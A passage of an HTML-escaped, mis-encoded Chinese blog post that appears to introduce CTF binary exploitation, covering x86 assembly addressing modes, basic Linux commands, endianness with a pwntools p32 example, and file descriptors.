&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†ebxçš„å€¼èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç›´æ¥å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†ecxåŠ ä¸Š4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; åŸºå€å˜å€å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†2èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†1èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†ecxåŠ ä¸Š8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; å°†ecx+edx*2-6æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; è¾“å‡ºå­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; ç³»ç»Ÿè°ƒç”¨å·4ä»£è¡¨è¾“å‡ºå­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; æ–‡ä»¶æè¿°ç¬¦1ä»£è¡¨æ ‡å‡†è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;; è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„é•¿åº¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; é€€å‡ºç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; ç³»ç»Ÿè°ƒç”¨å·1ä»£è¡¨é€€å‡ºç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;xor&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; è¿”å›å€¼ä¸º0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; è°ƒç”¨ç³»ç»Ÿè°ƒç”¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;linuxåŸºç¡€&#34;&gt;LinuxåŸºç¡€
&lt;/h2&gt;&lt;p&gt;è¿™ä¸€ç« å†…å®¹å¤šæ˜¯ä¸€äº›æ–‡å­—æè¿°ï¼Œä¹Ÿä¼šæœ‰ç”Ÿæ´»æ¡ˆä¾‹åŠ ä»¥ç†è§£ï¼Œå›¾ç‰‡è¾ƒå°‘ï¼Œè¾ƒä¸ºæ¯ç‡¥ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-1/1.png&#34;
	width=&#34;1011&#34;
	height=&#34;599&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-1/1_hu_f407604601a0a452.png 480w, https://expl0rer.top/p/pwn-1/1_hu_f5a7b4b89149cb17.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Linuxå¤§å®¶æ—&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;168&#34;
		data-flex-basis=&#34;405px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¿æŠ¤å±‚çº§ï¼šåˆ†ä¸ºå››ä¸ªring0-ring3ã€‚ä¸€èˆ¬æ¥è¯´å°±ä¸¤ä¸ªï¼š0ä¸ºå†…æ ¸ï¼Œ3ä¸ºç”¨æˆ·ã€‚&lt;/p&gt;
&lt;p&gt;æƒé™ï¼šç”¨æˆ·åˆ†ä¸ºå¤šä¸ªç»„&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶å’Œç›®å½•ç­‰ç­‰çš„æƒé™ä¸€èˆ¬éƒ½æ˜¯ä¸‰ä¸ªï¼Œå³å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œ
è¯»ï¼šRï¼Œå†™ï¼šWï¼Œæ‰§è¡Œï¼šX&lt;/p&gt;
&lt;p&gt;èµ‹äºˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œæƒé™å°±æ˜¯chmod +x filename&lt;/p&gt;
&lt;h3 id=&#34;æ“ä½œç³»ç»Ÿ&#34;&gt;æ“ä½œç³»ç»Ÿ
&lt;/h3&gt;&lt;p&gt;åœ¨ç¬¬ä¸€é˜¶æ®µå­¦ä¹ ä¸­æˆ‘ä»¬æ¥è§¦åˆ°äº†Linuxæ“ä½œç³»ç»Ÿçš„ç›¸å…³æŒ‡ä»¤ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;åç§°&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;ä½œç”¨&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;ç¤ºä¾‹ï¼ˆä»¥Kaliè™šæ‹Ÿæœºä¸ºä¾‹ï¼‰&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ls&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ—å‡ºå½“å‰ç›®å½•æ–‡ä»¶&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ls&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;cd&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ‡æ¢ç›®å½•&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;cd/home/ctf&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;pwd&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;æ‰“å°å½“å‰ç›®å½•&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;pwd&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;touch&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ›å»ºç©ºç™½æ–‡ä»¶&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;touch flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;mkdir&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ›å»ºç›®å½•&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;mkdir /home/ctf&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;rmdir&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ é™¤ç›®å½•&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;rmdir /home/ctf&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;rm&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ é™¤æ–‡ä»¶&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;rm flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;cp&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;å¤åˆ¶æ–‡ä»¶&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;cp /home/ctf/flag /home/flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;mv&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;ç§»åŠ¨æ–‡ä»¶&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;mv flag /home/ctf/flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;cat&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;è¾“å‡ºæ–‡ä»¶å†…å®¹&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;cat flag&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;diff&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶ä¿¡æ¯&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;diff flag1 flag2&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;chmod&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;åˆ‡æ¢æ‰§è¡Œæƒé™&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;chmod 777 elf1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;locate&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;æŸ¥æ‰¾æ–‡ä»¶&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;locate flag&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;æ•°æ®å­˜å‚¨&#34;&gt;æ•°æ®å­˜å‚¨
&lt;/h3&gt;&lt;p&gt;è®¡ç®—æœºå†…éƒ¨æœ‰ä¸¤ç§æ•°æ®çš„å­˜å‚¨å½¢å¼ï¼š&lt;strong&gt;å¤§ç«¯åºã€å°ç«¯åº&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¤§ç«¯åº&lt;/strong&gt;ï¼šæ•°æ®é«˜ä½å­˜å‚¨åœ¨è®¡ç®—æœºåœ°å€çš„ä½ä½ï¼Œæ•°æ®ä½ä½å­˜å‚¨åœ¨åœ°å€çš„é«˜ä½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å°ç«¯åº&lt;/strong&gt;ï¼šæ•°æ®é«˜ä½å­˜å‚¨åœ¨è®¡ç®—æœºåœ°å€çš„é«˜ä½ï¼Œæ•°æ®ä½ä½å­˜å‚¨åœ¨åœ°å€çš„ä½ä½ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;å¤§ç«¯åºï¼šé«˜ä½ä½é«˜&lt;/p&gt;
&lt;p&gt;å°ç«¯åºï¼šé«˜é«˜ä½ä½&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™æ—¶æˆ‘ä¹Ÿçœ‹ä¸æ‡‚ï¼Œä¸Šä¾‹å­ï¼&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»¥ä¸€ä¸ªæ•°æ®ï¼š0x123456789abcdefï¼›é‚£ä¹ˆ0ä¸ºä½åœ°å€ï¼Œ7ä¸ºé«˜åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;å¤§ç«¯åºå­˜å‚¨ï¼šä½ä½å‚¨å­˜åˆ°è®¡ç®—æœºåœ°å€é«˜ä½&amp;hellip;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;0&lt;/th&gt;
          &lt;th&gt;1&lt;/th&gt;
          &lt;th&gt;2&lt;/th&gt;
          &lt;th&gt;3&lt;/th&gt;
          &lt;th&gt;4&lt;/th&gt;
          &lt;th&gt;5&lt;/th&gt;
          &lt;th&gt;6&lt;/th&gt;
          &lt;th&gt;7&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;01&lt;/td&gt;
          &lt;td&gt;23&lt;/td&gt;
          &lt;td&gt;45&lt;/td&gt;
          &lt;td&gt;67&lt;/td&gt;
          &lt;td&gt;89&lt;/td&gt;
          &lt;td&gt;ab&lt;/td&gt;
          &lt;td&gt;cd&lt;/td&gt;
          &lt;td&gt;ef&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å°†æ­¤æ•°æ®æŒ‰ç…§å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¾—åˆ°ï¼š\x01\x23\x45\x67\x89\xab\xcd\xef&lt;/p&gt;
&lt;p&gt;å°ç«¯åºå­˜å‚¨ï¼šä½ä½å‚¨å­˜åˆ°è®¡ç®—æœºåœ°å€çš„ä½ä½&amp;hellip;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;0&lt;/th&gt;
          &lt;th&gt;1&lt;/th&gt;
          &lt;th&gt;2&lt;/th&gt;
          &lt;th&gt;3&lt;/th&gt;
          &lt;th&gt;4&lt;/th&gt;
          &lt;th&gt;5&lt;/th&gt;
          &lt;th&gt;6&lt;/th&gt;
          &lt;th&gt;7&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;ef&lt;/td&gt;
          &lt;td&gt;cd&lt;/td&gt;
          &lt;td&gt;Ab&lt;/td&gt;
          &lt;td&gt;89&lt;/td&gt;
          &lt;td&gt;67&lt;/td&gt;
          &lt;td&gt;45&lt;/td&gt;
          &lt;td&gt;23&lt;/td&gt;
          &lt;td&gt;01&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å°†æ­¤æ•°æ®æŒ‰ç…§å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¾—åˆ°ï¼š\xef\xcd\xab\x89\x67\x45\x23\x01&lt;/p&gt;
&lt;p&gt;ä»ä¸Šé¢è¿™ä¸¤ç§æ–¹å¼æ¯”è¾ƒçš„è¯ï¼Œå¯ä»¥çŸ¥é“ï¼Œå¤§ç«¯åºç¬¦åˆäººç±»çš„é˜…è¯»ä¹ æƒ¯ï¼›ä½†ä»å­˜å‚¨é€»è¾‘ã€æ•°å­¦è¿ç®—è§„å¾‹æ¥çœ‹ï¼Œå°ç«¯åºæ›´æ­£å¸¸ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;Linuxæ•°æ®å­˜å‚¨çš„æ ¼å¼ä¸º&lt;strong&gt;å°ç«¯åº&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;Linuxæ˜¯å°ç«¯åºå‚¨å­˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å…¥ä¸€ä¸ªæ•°å­—æ—¶ï¼Œè¦æ³¨æ„æ ¼å¼ï¼Œæ¯”å¦‚è¾“å…¥0xdeadbeefè¿™ä¸ªæ•°å­—ã€‚&lt;/p&gt;
&lt;p&gt;å­—ç¬¦ä¸²è¾“å…¥å°±æ˜¯â€œ\xef\xbe\xad\xdeâ€ä¼ å…¥ç»™ç¨‹åºã€‚ä¸è¿‡å¥½åœ¨æœ‰&lt;strong&gt;pwntools&lt;/strong&gt;ï¼Œp32(0xdeadbeef)å³å¯å®Œæˆè‡ªåŠ¨è½¬æ¢ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ–‡ä»¶æè¿°ç¬¦&#34;&gt;æ–‡ä»¶æè¿°ç¬¦
&lt;/h3&gt;&lt;p&gt;Linuxç³»ç»Ÿä¸­ï¼ŒæŠŠä¸€åˆ‡éƒ½çœ‹åšæ˜¯æ–‡ä»¶ï¼Œå½“è¿›ç¨‹æ‰“å¼€ç°æœ‰æ–‡ä»¶æˆ–åˆ›å»ºæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ–‡ä»¶æè¿°ç¬¦å°±æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œç”¨æ¥æŒ‡å‘è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡Œ I/O æ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½ä¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦ã€‚&lt;/p&gt;
